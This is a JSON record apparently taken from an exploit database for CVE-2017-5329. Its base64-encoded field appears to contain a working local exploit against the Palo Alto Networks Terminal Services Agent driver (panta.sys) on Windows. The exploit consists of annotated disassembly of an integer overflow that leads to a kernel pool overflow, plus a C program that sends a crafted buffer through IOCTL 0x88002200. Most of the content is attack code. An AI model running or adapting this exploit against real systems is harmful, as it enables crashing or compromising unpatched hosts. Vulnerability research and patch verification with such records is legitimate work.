{
    "source": "exploit-database", 
    "exploit": "77u/LyoNCg0KRXhwbG9pdCBUaXRsZSAgICAtIFBhbG8gQWx0byBOZXR3b3JrcyBUZXJtaW5hbCBTZXJ2aWNlcyBBZ2VudCBJbnRlZ2VyIE92ZXJmbG93DQpEYXRlICAgICAgICAgICAgIC0gMjZ0aCBKYW51YXJ5IDIwMTcNCkRpc2NvdmVyZWQgYnkgICAgLSBQYXJ2ZXogQW53YXIgKEBwYXJ2ZXpnaGgpDQpWZW5kb3IgSG9tZXBhZ2UgIC0gaHR0cHM6Ly93d3cucGFsb2FsdG9uZXR3b3Jrcy5jb20vDQpUZXN0ZWQgVmVyc2lvbiAgIC0gNy4wLjMtMTMgDQpEcml2ZXIgVmVyc2lvbiAgIC0gNi4wLjcuMCAtIHBhbnRhLnN5cw0KVGVzdGVkIG9uIE9TICAgICAtIDMyYml0IFdpbmRvd3MgNyBTUDEgDQpDVkUgSUQgICAgICAgICAgIC0gQ1ZFLTIwMTctNTMyOQ0KVmVuZG9yIGZpeCB1cmwgICAtIGh0dHBzOi8vc2VjdXJpdHlhZHZpc29yaWVzLnBhbG9hbHRvbmV0d29ya3MuY29tLyANCiAgICAgICAgICAgICAgICAgICBodHRwczovL3NlY3VyaXR5YWR2aXNvcmllcy5wYWxvYWx0b25ldHdvcmtzLmNvbS9Ib21lL0RldGFpbC83MQ0KRml4ZWQgVmVyc2lvbiAgICAtIDcuMC43IGFuZCBsYXRlciANCkZpeGVkIGRyaXZlciB2ZXIgLSA2LjAuOC4wDQoNCg0KRGlzYXNzZW1ibHkNCi0tLS0tLS0tLS0tDQoNCi50ZXh0OjlBMjZGMEJEIGxvY185QTI2RjBCRDogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCi50ZXh0OjlBMjZGMEJEICAgICAgICAgICAgICAgICBtb3YgICAgIGVjeCwgRGV2aWNlT2JqZWN0ICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCi50ZXh0OjlBMjZGMEMzICAgICAgICAgICAgICAgICBtb3YgICAgIGR3b3JkIHB0ciBbZWN4KzFBQ2hdLCAwICAgICAgICAgICAgICAgICAgICAgICANCi50ZXh0OjlBMjZGMENEICAgICAgICAgICAgICAgICBtb3YgICAgIGVkeCwgRGV2aWNlT2JqZWN0DQoudGV4dDo5QTI2RjBEMyAgICAgICAgICAgICAgICAgbW92ICAgICBlYXgsIFtlZHgrMUI4aF0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBlYXggcG9pbnRzIHRvIG91ciBpbnB1dHRlZCBidWZmZXINCi50ZXh0OjlBMjZGMEQ5ICAgICAgICAgICAgICAgICBtb3YgICAgIGVjeCwgW2VheCsxNGhdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IFRha2VzIHNpemUgdG8gYWxsb2NhdGUgZnJvbSBvdXIgaW5wdXR0ZWQgYnVmZmVyIDB4MDQ5MjQ5MjUNCi50ZXh0OjlBMjZGMERDICAgICAgICAgICAgICAgICBpbXVsICAgIGVjeCwgMzhoICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IDB4MzggKiAweDA0OTI0OTI1ID0gMHgxMDAwMDAwMTguIFdyYXBzIHJvdW5kIGJlY29taW5nIHNpemUgdG8gYWxsb2NhdGUgMHgxOCAoSW50ZWdlciBPdmVyZmxvdykNCi50ZXh0OjlBMjZGMERGICAgICAgICAgICAgICAgICBtb3YgICAgIFtlYnArTnVtYmVyT2ZCeXRlc10sIGVjeCAgICAgICAgICAgICAgICAgICAgICA7IENvcHkgZWN4IHZhbHVlIDB4MTggb250byBzdGFjaw0KLnRleHQ6OUEyNkYwRTIgICAgICAgICAgICAgICAgIHB1c2ggICAgNDQ0MTU0NTBoICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsgVGFnIChQVEFEIHN0cmluZyB1c2VkKQ0KLnRleHQ6OUEyNkYwRTcgICAgICAgICAgICAgICAgIG1vdiAgICAgZWR4LCBbZWJwK051bWJlck9mQnl0ZXNdICAgICAgICAgICAgICAgICAgICAgIDsgQ29weSBzaXplIDB4MTggdG8gZWR4DQoudGV4dDo5QTI2RjBFQSAgICAgICAgICAgICAgICAgcHVzaCAgICBlZHggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBOdW1iZXJPZkJ5dGVzDQoudGV4dDo5QTI2RjBFQiAgICAgICAgICAgICAgICAgcHVzaCAgICAwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBQb29sVHlwZQ0KLnRleHQ6OUEyNkYwRUQgICAgICAgICAgICAgICAgIGNhbGwgICAgZHM6RXhBbGxvY2F0ZVBvb2xXaXRoVGFnICAgICAgICAgICAgICAgICAgICAgIDsgSWYgcmV0dXJuZWQgbnVsbCAoZWF4KSBleGl0cyB3aXRoIGVycm9yIGNsZWFubHkgZWxzZSB0YWtlcyBjcmFzaCBwYXRoIA0KLnRleHQ6OUEyNkYwRjMgICAgICAgICAgICAgICAgIG1vdiAgICAgZWN4LCBEZXZpY2VPYmplY3QNCi50ZXh0OjlBMjZGMEY5ICAgICAgICAgICAgICAgICBtb3YgICAgIFtlY3grMUIwaF0sIGVheA0KLnRleHQ6OUEyNkYwRkYgICAgICAgICAgICAgICAgIG1vdiAgICAgZWR4LCBEZXZpY2VPYmplY3QNCi50ZXh0OjlBMjZGMTA1ICAgICAgICAgICAgICAgICBjbXAgICAgIGR3b3JkIHB0ciBbZWR4KzFCMGhdLCAwICAgICAgICAgICAgICAgICAgICAgICA7IENoZWNrcyByZXR1cm4gdmFsdWUuIElmIG5vdCBudWxsIHRoZW4ganVtcHMgdG8gb3VyIGNyYXNoIHBhdGgNCi50ZXh0OjlBMjZGMTBDICAgICAgICAgICAgICAgICBqbnogICAgIHNob3J0IGxvY185QTI2RjEzQyAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IEV4aXRzIHdpdGggZXJyb3IgY2xlYW5seSBpZiBpbmNvcnJlY3Qgc2l6ZSB2YWx1ZSBidXQgbm90IGNyYXNoYWJsZSB2YWx1ZQ0KDQoudGV4dDo5QTI2RjEzQw0KLnRleHQ6OUEyNkYxM0MgbG9jXzlBMjZGMTNDOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KLnRleHQ6OUEyNkYxM0MgICAgICAgICAgICAgICAgIG1vdiAgICAgZWN4LCBbZWJwK051bWJlck9mQnl0ZXNdDQoudGV4dDo5QTI2RjEzRiAgICAgICAgICAgICAgICAgcHVzaCAgICBlY3ggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyAweDE4IG91ciBhbGxvY2F0ZWQgcG9vbCBtZW1vcnkNCi50ZXh0OjlBMjZGMTQwICAgICAgICAgICAgICAgICBwdXNoICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IGludCwgc2V0cyBhbGxvY2F0ZWQgbWVtb3J5IHRvIDB4MDANCi50ZXh0OjlBMjZGMTQyICAgICAgICAgICAgICAgICBtb3YgICAgIGVkeCwgRGV2aWNlT2JqZWN0DQoudGV4dDo5QTI2RjE0OCAgICAgICAgICAgICAgICAgbW92ICAgICBlYXgsIFtlZHgrMUIwaF0NCi50ZXh0OjlBMjZGMTRFICAgICAgICAgICAgICAgICBwdXNoICAgIGVheCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IFBvaW50ZXIgdG8gb3VyIGFsbG9jYXRlZCBidWZmZXINCi50ZXh0OjlBMjZGMTRGICAgICAgICAgICAgICAgICBjYWxsICAgIG1lbXNldA0KLnRleHQ6OUEyNkYxNTQgICAgICAgICAgICAgICAgIGFkZCAgICAgZXNwLCAwQ2gNCi50ZXh0OjlBMjZGMTU3ICAgICAgICAgICAgICAgICBtb3YgICAgIFtlYnArdmFyXzRdLCAwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IE51bGwgb3V0IGVicC00DQoudGV4dDo5QTI2RjE1RSAgICAgICAgICAgICAgICAgam1wICAgICBzaG9ydCBsb2NfOUEyNkYxNjkNCg0KLnRleHQ6OUEyNkYxNjAgbG9jXzlBMjZGMTYwOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KLnRleHQ6OUEyNkYxNjAgICAgICAgICAgICAgICAgIG1vdiAgICAgZWN4LCBbZWJwK3Zhcl80XQ0KLnRleHQ6OUEyNkYxNjMgICAgICAgICAgICAgICAgIGFkZCAgICAgZWN4LCAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsgSW5jcmVtZW50IGNvdW50ZXINCi50ZXh0OjlBMjZGMTY2ICAgICAgICAgICAgICAgICBtb3YgICAgIFtlYnArdmFyXzRdLCBlY3ggICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IFN0b3JlIGNvdW50ZXIgdmFsdWUNCg0KLnRleHQ6OUEyNkYxNjkgbG9jXzlBMjZGMTY5OiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KLnRleHQ6OUEyNkYxNjkgICAgICAgICAgICAgICAgIG1vdiAgICAgZWR4LCBEZXZpY2VPYmplY3QgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KLnRleHQ6OUEyNkYxNkYgICAgICAgICAgICAgICAgIG1vdiAgICAgZWF4LCBbZWR4KzFCOGhdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsgZWF4IHBvaW50cyB0byBvdXIgaW5wdXR0ZWQgYnVmZmVyDQoudGV4dDo5QTI2RjE3NSAgICAgICAgICAgICAgICAgbW92ICAgICBlY3gsIFtlYnArdmFyXzRdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBMb29wIGNvdW50ZXIgbnVtYmVyDQoudGV4dDo5QTI2RjE3OCAgICAgICAgICAgICAgICAgY21wICAgICBlY3gsIFtlYXgrMTRoXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBDb21wYXJlcyBvdXIgaW5wdXR0ZWQgYnVmZmVyIHNpemUgMHgwNDkyNDkyNS4gSGVyZSBvdXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IHNpemUgaXMgbm90IHVzaW5nIHRoZSB3cmFwcGVkIHZhbHVlIHNvIGxvb3BzIHRpbGwgQlNPRA0KLnRleHQ6OUEyNkYxN0IgICAgICAgICAgICAgICAgIGpuYiAgICAgc2hvcnQgbG9jXzlBMjZGMTlBDQoudGV4dDo5QTI2RjE3RCAgICAgICAgICAgICAgICAgbW92ICAgICBlZHgsIFtlYnArdmFyXzRdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBDb3VudGVyIHZhbHVlDQoudGV4dDo5QTI2RjE4MCAgICAgICAgICAgICAgICAgaW11bCAgICBlZHgsIDM4aA0KLnRleHQ6OUEyNkYxODMgICAgICAgICAgICAgICAgIG1vdiAgICAgZWF4LCBEZXZpY2VPYmplY3QNCi50ZXh0OjlBMjZGMTg4ICAgICAgICAgICAgICAgICBtb3YgICAgIGVjeCwgW2VheCsxQjBoXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IFBvaW50ZXIgdG8gYWxsb2NhdGVkIHBvb2wgY29waWVkIHRvIGVjeA0KLnRleHQ6OUEyNkYxOEUgICAgICAgICAgICAgICAgIGxlYSAgICAgZWR4LCBbZWN4K2VkeCszMGhdICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsgcG9pbnRlcitzaXplKDB4MzgqZWR4KSsweDMwDQoudGV4dDo5QTI2RjE5MiAgICAgICAgICAgICAgICAgcHVzaCAgICBlZHgNCi50ZXh0OjlBMjZGMTkzICAgICAgICAgICAgICAgICBjYWxsICAgIHN1Yl85QTI2QzAwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IFN0YXJ0cyBvdmVyd3JpdGluZyBvdGhlciBwb29sIGFsbG9jYXRpb25zICEhIQ0KLnRleHQ6OUEyNkYxOTggICAgICAgICAgICAgICAgIGptcCAgICAgc2hvcnQgbG9jXzlBMjZGMTYwDQoNCg0KDQoudGV4dDo5QTI2QzAwMCBzdWJfOUEyNkMwMDAgICAgcHJvYyBuZWFyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoudGV4dDo5QTI2QzAwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCi50ZXh0OjlBMjZDMDAwDQoudGV4dDo5QTI2QzAwMCBhcmdfMCAgICAgICAgICAgPSBkd29yZCBwdHIgIDgNCi50ZXh0OjlBMjZDMDAwDQoudGV4dDo5QTI2QzAwMCAgICAgICAgICAgICAgICAgcHVzaCAgICBlYnAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoudGV4dDo5QTI2QzAwMSAgICAgICAgICAgICAgICAgbW92ICAgICBlYnAsIGVzcA0KLnRleHQ6OUEyNkMwMDMgICAgICAgICAgICAgICAgIG1vdiAgICAgZWF4LCBbZWJwK2FyZ18wXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsgQ29weSBhbGxvY2F0ZWQgYnVmZmVyIHBvaW50ZXIgKHBvaW50ZXIrc2l6ZSgweDM4KmVkeCkrMHgzMCkgdG8gZWF4DQoudGV4dDo5QTI2QzAwNiAgICAgICAgICAgICAgICAgbW92ICAgICBlY3gsIFtlYnArYXJnXzBdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBDb3B5IGFsbG9jYXRlZCBidWZmZXIgcG9pbnRlciAocG9pbnRlcitzaXplKDB4MzgqZWR4KSsweDMwKSB0byBlY3gNCi50ZXh0OjlBMjZDMDA5ICAgICAgICAgICAgICAgICBtb3YgICAgIFtlYXgrNF0sIGVjeCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IFN0b3JlIHBvaW50ZXIgaW4gYWxsb2NhdGVkIGJ1ZmZlciBhdCBwb2ludGVyK3NpemUoMHgzOCplZHgpKzB4MzArNA0KLnRleHQ6OUEyNkMwMEMgICAgICAgICAgICAgICAgIG1vdiAgICAgZWR4LCBbZWJwK2FyZ18wXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsgQ29weSBhbGxvY2F0ZWQgYnVmZmVyIHBvaW50ZXIrc2l6ZSgweDM4KmVkeCkrMHgzMCB0byBlZHgNCi50ZXh0OjlBMjZDMDBGICAgICAgICAgICAgICAgICBtb3YgICAgIGVheCwgW2VicCthcmdfMF0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7IENvcHkgYWxsb2NhdGVkIGJ1ZmZlciBwb2ludGVyK3NpemUoMHgzOCplZHgpKzB4MzAgdG8gZWF4DQoudGV4dDo5QTI2QzAxMiAgICAgICAgICAgICAgICAgbW92ICAgICBbZWR4XSwgZWF4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBTdG9yZSBwb2ludGVyIGluIGFsbG9jYXRlZCBidWZmZXIgYXQgcG9pbnRlcitzaXplKDB4MzgqZWR4KSsweDMwDQoudGV4dDo5QTI2QzAxNCAgICAgICAgICAgICAgICAgcG9wICAgICBlYnANCi50ZXh0OjlBMjZDMDE1ICAgICAgICAgICAgICAgICByZXRuICAgIDQNCi50ZXh0OjlBMjZDMDE1IHN1Yl85QTI2QzAwMCAgICBlbmRwDQoNCg0KDQoqLw0KDQoNCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8d2luZG93cy5oPg0KDQojZGVmaW5lIEJVRlNJWkUgNDQNCg0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSANCnsNCiAgICBIQU5ETEUgICAgICAgICBoRGV2aWNlOw0KICAgIGNoYXIgICAgICAgICAgIGRldmhhbmRsZVtNQVhfUEFUSF07DQogICAgRFdPUkQgICAgICAgICAgZHdSZXRCeXRlcyA9IDA7DQogICAgdW5zaWduZWQgY2hhciAgYnVmZmVyW0JVRlNJWkVdOw0KDQoNCiAgICBtZW1zZXQoYnVmZmVyLCAweDQxLCBCVUZTSVpFKTsNCg0KICAgIHByaW50ZigiXG5baV0gU2l6ZSBvZiB0b3RhbCBpbnB1dCBidWZmZXIgJWQgYnl0ZXMiLCBCVUZTSVpFKTsNCg0KICAgICooRFdPUkQqKShidWZmZXIgKyAyMCkgPSAweDA0OTI0OTI1Ow0KDQogICAgc3ByaW50ZihkZXZoYW5kbGUsICJcXFxcLlxcJXMiLCAicGFudGEiKTsNCg0KICAgIGhEZXZpY2UgPSBDcmVhdGVGaWxlKGRldmhhbmRsZSwgR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwgRklMRV9TSEFSRV9SRUFEIHwgRklMRV9TSEFSRV9XUklURSwgTlVMTCwgT1BFTl9FWElTVElORyAsIDAsIE5VTEwpOw0KICAgIA0KICAgIGlmKGhEZXZpY2UgPT0gSU5WQUxJRF9IQU5ETEVfVkFMVUUpDQogICAgew0KICAgICAgICBwcmludGYoIlxuWy1dIEZhaWxlZCB0byBvcGVuIGRldmljZSAlc1xuXG4iLCBkZXZoYW5kbGUpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIGVsc2UgDQogICAgew0KICAgICAgICBwcmludGYoIlxuWytdIE9wZW4gJXMgZGV2aWNlIHN1Y2Nlc3NmdWwiLCBkZXZoYW5kbGUpOw0KICAgIH0JDQoNCiAgICBwcmludGYoIlxuW35dIFByZXNzIGFueSBrZXkgdG8gY29udGludWUgLiAuIC4iKTsNCiAgICBnZXRjaCgpOw0KDQogICAgRGV2aWNlSW9Db250cm9sKGhEZXZpY2UsIDB4ODgwMDIyMDAsIGJ1ZmZlciwgQlVGU0laRSwgTlVMTCwgMCwgJmR3UmV0Qnl0ZXMsIE5VTEwpOyANCg0KICAgIHByaW50ZigiXG4iKTsNCiAgICBDbG9zZUhhbmRsZShoRGV2aWNlKTsNCiAgICByZXR1cm4gMDsNCn0=", 
    "filename": "platforms/windows/local/41176.c", 
    "id": "41176", 
    "cves": [
        "CVE-2017-5329"
    ]
}